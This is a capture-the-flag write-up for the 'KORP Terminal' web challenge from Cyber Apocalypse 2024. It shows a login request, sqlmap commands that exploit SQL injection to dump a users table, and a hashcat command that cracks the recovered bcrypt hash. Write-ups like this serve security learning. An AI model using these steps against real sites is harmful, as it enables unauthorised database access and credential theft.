---
layout: load_md
title: The White Circle | Cyber Apocalypse 2024 | KORP Terminal Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2024
parent: cyber_apocalypse_2024
category: web
challenge: KORP Terminal
tags: "web, legend, twh, sql, sqli, sqlmap, hashcat"
date: 2024-03-16T00:00:00+00:00
last_modified_at: 2024-03-16T00:00:00+00:00
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2024</h1>

## KORP Terminal
> Solved by : Legend, thewhiteh4t

- Challenge presents us with a login page
- Testing SQL injection shows that it is vulnerable

![](https://i.imgur.com/6LIGKIQ.png)

- POST request from burpsuite : 

```
    POST / HTTP/1.1
    Host: 94.237.58.148:47562
    Content-Length: 66
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: http://94.237.58.148:47562
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.57 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://94.237.58.148:47562
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-US,en;q=0.9
    Connection: close
    
    username=a&password=a
```

- SQLMap

```
> sqlmap -r post.txt --ignore-code 401
```

![](https://i.imgur.com/1zEpILb.png)


```
> sqlmap -r $PWD/post.txt --ignore-code 401 -T users -dump
```

![](https://i.imgur.com/WiTjnbb.png)

- This hash is crackable with hashcat

```
> hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
```

![](https://i.imgur.com/TSsdxz2.png)
